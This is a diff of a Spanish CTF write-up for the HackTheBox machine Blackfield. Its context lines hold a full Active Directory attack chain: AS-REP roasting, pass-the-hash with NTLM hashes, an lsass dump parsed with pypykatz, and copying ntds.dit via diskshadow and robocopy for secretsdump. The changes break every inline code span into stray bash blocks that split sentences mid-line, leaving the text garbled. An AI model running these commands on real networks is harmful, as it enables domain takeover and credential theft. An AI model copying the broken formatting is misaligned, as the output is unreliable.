@@ -75,7 +75,19 @@ smbclient -L 10.10.10.192 -N
 ```
 
 Vemos que estamos en frente de una maquina Windows 10 Standard de 64 bit pro que se llama **DC01** en el dominio **BLACKFIELD.local**.
-Añadimos los dominios `blackfield.local` y `dc01.blackfield.local` a nuestro `/etc/hosts`.
+Añadimos los dominios 
+```bash
+ blackfield.local 
+```
+ y 
+```bash
+ dc01.blackfield.local 
+```
+ a nuestro 
+```bash
+ /etc/hosts 
+```
+.
 
 Tambien vemos recursos compartidos a nivel de red como:
 
@@ -93,7 +105,15 @@ Usando de la heramienta smbmap, podemos ver si tenemos accessos a estos recursos
 smbmap -H 10.10.10.192 -u 'null'
 ```
 
-y vemos que denemos accesso con derecho de lectura a los recursos `profiles$` y `IPC$`. IPC$ no es un recurso que nos interesa.
+y vemos que denemos accesso con derecho de lectura a los recursos 
+```bash
+ profiles$ 
+```
+ y 
+```bash
+ IPC$ 
+```
+. IPC$ no es un recurso que nos interesa.
 
 ```bash
 smbclient //10.10.10.192/profiles$ -N
@@ -117,7 +137,11 @@ Una vez que tenemos un listado de usuarios, podemos hacer un **asproating attack
     rm users_dir
     ```
 
-1. Con `GetNPUsers.py` vamos a ver si podemos recuperar un TGT
+1. Con 
+```bash
+ GetNPUsers.py 
+```
+ vamos a ver si podemos recuperar un TGT
 
     ```bash
     GetNPUsers blackfield.local/ -no-pass -usersfile users | grep -v "not found"
@@ -147,12 +171,24 @@ crackmapexec winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight'
 ```
 
 Aqui vemos que el usuario es valido y que tiene permiso de lectura sobre el directorio **SYSVOL** y que lo normal seria de buscar si existe un
-fichero `groups.xml`, porque a dentro tienes un `cpassword=HASH` que contiene un hash que se podria crackear con la heramienta **gpp-decrypt** pero 
+fichero 
+```bash
+ groups.xml 
+```
+, porque a dentro tienes un 
+```bash
+ cpassword=HASH 
+```
+ que contiene un hash que se podria crackear con la heramienta **gpp-decrypt** pero 
 Tito no adelanta que no es el caso no se aplicaba.
 
 ### Kereroasting attack {-}
 
-Los ataques Kereroasting se pueden manejar con la utilidad `GetUserSPNs.py`
+Los ataques Kereroasting se pueden manejar con la utilidad 
+```bash
+ GetUserSPNs.py 
+```
+
 
 ```bash
 GetUserSPNs.py blackfield.local/support:#00^BlackKnight@10.10.10.192 -request -dc-ip 10.10.10.192
@@ -162,7 +198,11 @@ Esta utilidad nos retorna un mensaje como que no son las buenas credenciales.
 
 ### Enumeracion de usuarios con rpcclient {-}
 
-Ahora que tenemos credenciales validas, intentamos connectarnos al `rpcclient`
+Ahora que tenemos credenciales validas, intentamos connectarnos al 
+```bash
+ rpcclient 
+```
+
 
 ```bash
 rpcclient -U "support%#00^BlackKnight" 10.10.10.192
@@ -176,7 +216,11 @@ Ahora podemos ver la lista de los usuarios registrados a nivel de systema. Busca
 > rpcclient $> enumdomgroups
 ```
 
-copiamos el rid del grupo `Domain Admins` 
+copiamos el rid del grupo 
+```bash
+ Domain Admins 
+```
+ 
 
 ```bash
 > rpcclient $> querygroupmem 0x200
@@ -192,7 +236,11 @@ Vemos quel usuario es **Administrator**, pero lo hacemos para saber si hay otros
 
 ### Enumeracion del systema con bloodhound-python para ganar acceso a la maquina {-}
 
-Con la utilidad `bloodhound-python`, podemos enumerar cosas si tener que estar connectado a la maquina victima.
+Con la utilidad 
+```bash
+ bloodhound-python 
+```
+, podemos enumerar cosas si tener que estar connectado a la maquina victima.
 
 1. instalamos bloodhound
 
@@ -264,7 +312,11 @@ El cambio de contraseña a sido effectiva y ahora miramos que privilegios tiene 
 smbmap -H 10.10.10.192 -u 'audit2020' -p 's4vitar123$!'
 ```
 
-Vemos que este usuario tiene privilegios de lectura sobre el directorio `forensic`. Miramos lo que hay en este directorio.
+Vemos que este usuario tiene privilegios de lectura sobre el directorio 
+```bash
+ forensic 
+```
+. Miramos lo que hay en este directorio.
 
 
 
@@ -287,7 +339,15 @@ get lsass.zip
 
 Nos hemos descargados un fichero domain_users y un fichero domain_admins. Podemos ver un usuario **iPownedYourCompany** que nos hace
 pensar que esta maquina a sido comprometida anteriormente. Tambien vemos un directorio memory_analysis y un fichero nos llama la atencion.
-Este fichero es el `lsass.zip`. Nos llama la atencion porque hay una utilidad `pypykatz` con la cual podriamos ver informaciones relevantes dumpeadas
+Este fichero es el 
+```bash
+ lsass.zip 
+```
+. Nos llama la atencion porque hay una utilidad 
+```bash
+ pypykatz 
+```
+ con la cual podriamos ver informaciones relevantes dumpeadas
 a nivel de memoria. 
 
 ```bash
@@ -304,7 +364,11 @@ Vemos el hash del usuario Administrator. Controlamos esto con crackmap exec.
 crackmapexec smb 10.10.10.192 -u 'Administrator' -H '7f1e4ff8c5a8e6b5fcae2d9c0472cd62'
 ```
 
-Pero vemos que esta credencial no es valida. Vemos otro usuario `svc_backup` lo miramos.
+Pero vemos que esta credencial no es valida. Vemos otro usuario 
+```bash
+ svc_backup 
+```
+ lo miramos.
 
 ```bash
 crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9659d1d1dcd9250115e2206d9f49400d'
@@ -354,8 +418,16 @@ cd Temp
 reg save HKLM\system system
 ```
 
-Aqui hacemos una copia del systema que es necesario para posteriormente dumpear los hashes NTLM del fichero `ntds.dit`. Intentamos copiar 
-el fichero `ntds.dit`
+Aqui hacemos una copia del systema que es necesario para posteriormente dumpear los hashes NTLM del fichero 
+```bash
+ ntds.dit 
+```
+. Intentamos copiar 
+el fichero 
+```bash
+ ntds.dit 
+```
+
 
 ```bash
 copy C:\Windows\NTDS\ntds.dit ntds.dit
@@ -386,7 +458,11 @@ upload example.txt
 diskshadow.exe /s example.txt
 ```
 
-Ya podemos ver que en Z:\ hay el mismo contenido que en C:\ y si tratamos de copiar el fichero ntds.dit con el comando `copy z:\Windows\NTDS\ntds.dit ntds.dit` 
+Ya podemos ver que en Z:\ hay el mismo contenido que en C:\ y si tratamos de copiar el fichero ntds.dit con el comando 
+```bash
+ copy z:\Windows\NTDS\ntds.dit ntds.dit 
+```
+ 
 nos arastra el mismo error. Pero usando del comando robocopy esto funcciona sin problemas.
 
 ```bash
@@ -395,9 +471,17 @@ download ntds.dit
 download system
 ```
 
-> [ ! ] NOTAS: Si el download no funcciona, siempre podemos tratar de montar un directorio compartido a nivel de red con `impacket-smbfolder`
+> [ ! ] NOTAS: Si el download no funcciona, siempre podemos tratar de montar un directorio compartido a nivel de red con 
+```bash
+ impacket-smbfolder 
+```
 
-Ya podemos dumpear el ntds con `impacket-secretsdump`
+
+Ya podemos dumpear el ntds con 
+```bash
+ impacket-secretsdump 
+```
+
 
 ```bash
 impacket-secretsdump -ntds ntds.dit -system system LOCAL
